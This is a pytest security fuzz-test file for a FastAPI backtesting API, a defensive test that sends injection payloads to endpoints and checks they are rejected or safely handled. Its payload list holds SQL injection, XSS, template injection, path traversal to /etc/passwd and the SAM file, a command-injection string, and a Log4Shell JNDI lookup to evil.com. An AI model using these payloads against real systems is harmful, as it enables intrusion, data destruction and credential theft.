"""Security fuzz tests for injection attacks.

Sends SQL injection, XSS, and template injection payloads through
API inputs (symbol, name, description) and verifies that the server
never returns 500 (unhandled error). Valid responses are 422 (rejected
by validation) or 2xx (safely handled/escaped).
"""
from __future__ import annotations

from uuid import uuid4

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session, sessionmaker

from datetime import date
from decimal import Decimal

from apps.api.app import dispatch as dispatch_module
from apps.api.app.dependencies import get_current_user, get_current_user_readonly
from apps.api.app.main import app
from backtestforecast.db.session import get_db, get_readonly_db
from backtestforecast.models import User
from backtestforecast.schemas.forecasts import ForecastEnvelopeResponse
from backtestforecast.schemas.scans import HistoricalAnalogForecastResponse
from backtestforecast.services.scans import ScanService
from tests.postgres_support import reset_database

INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1; SELECT * FROM information_schema.tables --",
    "' UNION SELECT NULL, NULL --",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "{{constructor.constructor('return this')()}}",
    "%00null_byte",
    "../../../etc/passwd",
    "Robert'); DROP TABLE students;--",
    "\"; cat /etc/passwd",
    "' AND 1=1 --",
    "${jndi:ldap://evil.com/x}",
]


@pytest.fixture()
def unauthed_client() -> TestClient:
    """Client without any auth overrides for testing raw endpoint behavior."""
    with TestClient(app, base_url="http://localhost") as tc:
        yield tc


@pytest.fixture()
def authed_client(
    monkeypatch: pytest.MonkeyPatch,
    postgres_session_factory: sessionmaker[Session],
) -> TestClient:
    """Client with auth bypass for testing input handling."""
    reset_database(postgres_session_factory)
    clerk_user_id = f"clerk_fuzz_user_{uuid4()}"
    fuzz_user = User(
        id=uuid4(),
        clerk_user_id=clerk_user_id,
        email="fuzz@example.com",
        plan_tier="premium",
        subscription_status="active",
    )
    user_context = User(
        id=fuzz_user.id,
        clerk_user_id=fuzz_user.clerk_user_id,
        email=fuzz_user.email,
        plan_tier=fuzz_user.plan_tier,
        subscription_status=fuzz_user.subscription_status,
        subscription_current_period_end=None,
        cancel_at_period_end=False,
    )

    def override_current_user():
        return user_context

    with postgres_session_factory() as session:
        existing = session.query(User).filter(User.clerk_user_id == fuzz_user.clerk_user_id).one_or_none()
        if existing is None:
            session.add(fuzz_user)
            session.commit()
        else:
            fuzz_user = existing

    def override_get_db():
        db = postgres_session_factory()
        try:
            yield db
        finally:
            db.close()

    def fake_build_forecast(self, *, user: User, symbol: str, strategy_type: str | None, horizon_days: int) -> ForecastEnvelopeResponse:
        return ForecastEnvelopeResponse(
            forecast=HistoricalAnalogForecastResponse(
                symbol=symbol,
                strategy_type=strategy_type,
                as_of_date=date(2025, 1, 2),
                horizon_days=horizon_days,
                analog_count=1,
                expected_return_low_pct=Decimal("-1"),
                expected_return_median_pct=Decimal("0"),
                expected_return_high_pct=Decimal("1"),
                positive_outcome_rate_pct=Decimal("50"),
                summary="stub",
                disclaimer="stub",
                analog_dates=[],
            ),
            expected_move_abs_pct=Decimal("1"),
        )

    def fake_dispatch_celery_task(**kwargs):
        job = kwargs["job"]
        if getattr(job, "celery_task_id", None) is None:
            job.celery_task_id = f"fuzz-{uuid4()}"
        return dispatch_module.DispatchResult.SENT

    app.dependency_overrides[get_current_user] = override_current_user
    app.dependency_overrides[get_current_user_readonly] = override_current_user
    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[get_readonly_db] = override_get_db
    monkeypatch.setattr(ScanService, "build_forecast", fake_build_forecast)
    monkeypatch.setattr(dispatch_module, "dispatch_celery_task", fake_dispatch_celery_task)
    with TestClient(app, base_url="http://localhost", raise_server_exceptions=False) as tc:
        yield tc
    app.dependency_overrides.clear()


_AUTH_HEADERS = {"Authorization": "Bearer fuzz-token"}


class TestSymbolInjection:
    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
    def test_backtest_symbol_rejects_injection(self, authed_client: TestClient, payload: str):
        resp = authed_client.post(
            "/v1/backtests",
            json={
                "symbol": payload,
                "strategy_type": "long_call",
                "start_date": "2024-01-02",
                "end_date": "2024-03-29",
                "target_dte": 30,
                "dte_tolerance_days": 5,
                "max_holding_days": 10,
                "account_size": "10000",
                "risk_per_trade_pct": "5",
                "commission_per_contract": "1",
                "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": "30", "period": 14}],
            },
            headers=_AUTH_HEADERS,
        )
        assert resp.status_code != 500, (
            f"Server error for payload {payload!r}: {resp.text}"
        )
        if resp.status_code == 200:
            body_text = resp.text
            assert payload not in body_text, f"Injection payload reflected in response for POST /v1/backtests: {payload!r}"

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
    def test_forecast_ticker_rejects_injection(self, authed_client: TestClient, payload: str):
        resp = authed_client.get(f"/v1/forecasts/{payload}", headers=_AUTH_HEADERS)
        assert resp.status_code != 500, (
            f"Server error for ticker {payload!r}: {resp.text}"
        )
        if resp.status_code == 200:
            body_text = resp.text
            assert payload not in body_text, f"Injection payload reflected in response for GET /v1/forecasts: {payload!r}"


class TestNameInjection:
    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
    def test_template_name_rejects_injection(self, authed_client: TestClient, payload: str):
        resp = authed_client.post(
            "/v1/templates",
            json={
                "name": payload,
                "config": {
                    "strategy_type": "long_call",
                    "target_dte": 30,
                    "dte_tolerance_days": 5,
                    "max_holding_days": 10,
                    "account_size": 10000,
                    "risk_per_trade_pct": 2,
                    "commission_per_contract": 0.65,
                    "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": 35, "period": 14}],
                },
            },
            headers=_AUTH_HEADERS,
        )
        assert resp.status_code != 500, (
            f"Server error for name {payload!r}: {resp.text}"
        )
        if resp.status_code == 200:
            body_text = resp.text
            assert payload not in body_text, f"Injection payload reflected in response for POST /v1/templates: {payload!r}"

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
    def test_scan_name_rejects_injection(self, authed_client: TestClient, payload: str):
        resp = authed_client.post(
            "/v1/scans",
            json={
                "name": payload,
                "mode": "basic",
                "symbols": ["AAPL"],
                "strategy_types": ["long_call"],
                "rule_sets": [
                    {"name": "t", "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": "30", "period": 14}]},
                ],
                "start_date": "2024-01-02",
                "end_date": "2024-03-29",
                "target_dte": 30,
                "max_holding_days": 10,
                "account_size": "10000",
                "risk_per_trade_pct": "5",
                "commission_per_contract": "1",
            },
            headers=_AUTH_HEADERS,
        )
        assert resp.status_code != 500, (
            f"Server error for scan name {payload!r}: {resp.text}"
        )
        if resp.status_code == 200:
            body_text = resp.text
            assert payload not in body_text, f"Injection payload reflected in response for POST /v1/scans: {payload!r}"


class TestPathTraversal:
    @pytest.mark.parametrize("payload", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f",
        "....//....//etc/passwd",
    ])
    def test_export_path_traversal(self, authed_client: TestClient, payload: str):
        resp = authed_client.get(f"/v1/exports/{payload}", headers=_AUTH_HEADERS)
        assert resp.status_code != 500
        assert resp.status_code in (404, 422, 400)
